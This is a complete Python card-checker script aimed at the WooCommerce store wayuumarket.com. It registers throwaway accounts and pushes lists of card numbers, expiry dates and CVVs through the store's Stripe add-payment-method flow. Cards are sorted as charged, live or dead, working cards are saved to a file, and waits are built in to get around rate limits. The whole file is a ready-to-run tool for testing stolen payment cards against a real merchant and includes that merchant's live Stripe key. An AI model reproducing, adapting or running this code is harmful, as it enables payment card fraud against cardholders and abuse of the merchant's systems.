"""
WayuuMarket Checker v5.2
Shows real API responses for verification
"""
import requests
import random
import string
import uuid
import time
import os
import re

INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 5

def randmail():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'

def get_bin(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','').upper()} | {d.get('bank',{}).get('name','')} | {d.get('country',{}).get('name','')}"
    except:
        pass
    return cc[:6]

def check_card(cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    try:
        s = requests.Session()
        s.headers.update({
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        })
        
        # Register
        print("[*] Registering...")
        r = s.get('https://wayuumarket.com/my-account/', timeout=60)
        m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
        if not m:
            return 'ERROR', 'No register nonce', ''
        
        email = randmail()
        s.post('https://wayuumarket.com/my-account/', data={
            'email': email,
            'woocommerce-register-nonce': m.group(1),
            'register': 'Register',
        }, timeout=60)
        
        # Get payment page
        print("[*] Getting payment page...")
        r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=60)
        html = r.text
        
        fnonce = re.search(r'add-payment-method-nonce.*?value="([^"]+)"', html)
        wpnonce = re.search(r'name="_wpnonce"\s*value="([^"]+)"', html)
        
        # Create PM
        print("[*] Creating PM...")
        guid = str(uuid.uuid4())
        
        pm_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={'content-type': 'application/x-www-form-urlencoded'},
            data={
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'guid': guid,
                'muid': guid,
                'sid': guid,
                'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
            },
            timeout=60
        ).json()
        
        # Show PM response
        print(f"[DEBUG] PM Response: {pm_resp}")
        
        if 'error' in pm_resp:
            c = pm_resp['error'].get('decline_code') or pm_resp['error'].get('code', '')
            msg = pm_resp['error'].get('message', '')
            
            if c in ['incorrect_cvc', 'insufficient_funds', 'generic_decline', 'expired_card', 
                     'lost_card', 'stolen_card', 'do_not_honor', 'card_velocity_exceeded']:
                return 'CCN', c, msg
            return 'DEAD', c or msg[:40], msg
        
        pm_id = pm_resp.get('id', '')
        if not pm_id:
            return 'ERROR', 'No PM', ''
        
        print(f"[*] PM ID: {pm_id}")
        
        # Submit form
        print("[*] Submitting form...")
        r = s.post(
            'https://wayuumarket.com/my-account/add-payment-method/',
            data={
                'payment_method': 'stripe',
                'wc-stripe-payment-token': 'new',
                'wc_stripe_payment_method': pm_id,
                'stripe_source': pm_id,
                'woocommerce-add-payment-method-nonce': fnonce.group(1) if fnonce else '',
                '_wpnonce': wpnonce.group(1) if wpnonce else '',
            },
            timeout=60
        )
        
        # Show response details
        print(f"[DEBUG] Response URL: {r.url}")
        print(f"[DEBUG] Response Status: {r.status_code}")
        
        # Extract any messages from response
        txt = r.text
        
        # Look for success message
        success_match = re.search(r'class="woocommerce-message"[^>]*>([^<]+)', txt)
        if success_match:
            print(f"[DEBUG] Success Message: {success_match.group(1).strip()}")
        
        # Look for error message  
        error_match = re.search(r'class="woocommerce-error"[^>]*>.*?<li>([^<]+)', txt, re.DOTALL)
        if error_match:
            print(f"[DEBUG] Error Message: {error_match.group(1).strip()}")
        
        # Check for notices
        notice_match = re.search(r'class="woocommerce-notice[^"]*"[^>]*>([^<]+)', txt)
        if notice_match:
            print(f"[DEBUG] Notice: {notice_match.group(1).strip()}")
        
        txt_lower = txt.lower()
        
        # Check responses
        if success_match or ('payment method' in txt_lower and 'added' in txt_lower):
            return 'CHARGED', 'Card Added!', success_match.group(1).strip() if success_match else 'Added'
        
        if error_match:
            err = error_match.group(1).strip()
            if any(x in err.lower() for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen', 'security']):
                return 'CCN', err[:40], err
            return 'DEAD', err[:40], err
        
        if 'declined' in txt_lower:
            return 'CCN', 'Declined', 'Card was declined'
        if 'insufficient' in txt_lower:
            return 'CCN', 'Insufficient Funds', 'Insufficient funds'
        if 'cvc' in txt_lower or 'security code' in txt_lower:
            return 'CCN', 'CVC Error', 'CVC verification failed'
        if 'expired' in txt_lower:
            return 'CCN', 'Expired', 'Card expired'
        if 'authentication' in txt_lower or '3d secure' in txt_lower:
            return 'CCN', '3DS Required', '3D Secure required'
        
        # Check if redirected to payment-methods (success)
        if '/payment-methods/' in r.url and '/add-payment-method' not in r.url:
            return 'CHARGED', 'Redirected to Payment Methods', 'Card likely added'
        
        brand = pm_resp.get('card', {}).get('brand', '').upper()
        return 'LIVE', f'PM OK ({brand})', 'No clear success/error message'
        
    except requests.exceptions.ConnectionError as e:
        return 'ERROR', 'Connection Reset', str(e)[:50]
    except requests.exceptions.Timeout:
        return 'ERROR', 'Timeout', 'Request timed out'
    except Exception as e:
        return 'ERROR', str(e)[:30], str(e)

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    WAYUUMARKET CHECKER v5.2           ║
    ║    With Debug Response Output         ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("No cards!")
        return
    
    print(f"Cards: {len(cards)}")
    print(f"Delay: {DELAY}s")
    print("=" * 50)
    
    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0, 'error': 0}
    
    for i, card in enumerate(cards, 1):
        p = card.split('|')
        if len(p) < 4:
            continue
        
        cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n{'='*50}")
        print(f"[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
        print(f"{'='*50}")
        
        start = time.time()
        status, msg, raw_response = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        print(f"\n[DEBUG] Raw Response: {raw_response}")
        
        if status == 'CHARGED':
            print(f"\n>>> [CHARGED] {full}")
            print(f">>> {msg}")
            print(f">>> {get_bin(cc)}")
            stats['charged'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|CHARGED|{msg}\n")
        elif status == 'CCN':
            print(f"\n>>> [CCN] {full}")
            print(f">>> {msg}")
            print(f">>> {get_bin(cc)}")
            stats['ccn'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|CCN|{msg}\n")
        elif status == 'LIVE':
            print(f"\n>>> [LIVE] {full}")
            print(f">>> {msg}")
            print(f">>> {get_bin(cc)}")
            stats['live'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|LIVE|{msg}\n")
        elif status == 'ERROR':
            print(f"\n>>> [ERROR] {msg}")
            stats['error'] += 1
            if 'rate' in msg.lower() or 'connection' in msg.lower():
                print("[*] Waiting 30s...")
                time.sleep(30)
        else:
            print(f"\n>>> [DEAD] {full}")
            print(f">>> {msg}")
            stats['dead'] += 1
            open(DEAD_FILE, 'a').write(f"{full}|{msg}\n")
        
        print(f"\n[Time: {t}s]")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 50)
    print("FINAL RESULTS")
    print("=" * 50)
    print(f"CHARGED: {stats['charged']}")
    print(f"CCN:     {stats['ccn']}")
    print(f"LIVE:    {stats['live']}")
    print(f"DEAD:    {stats['dead']}")
    print(f"ERROR:   {stats['error']}")

if __name__ == "__main__":
    main()
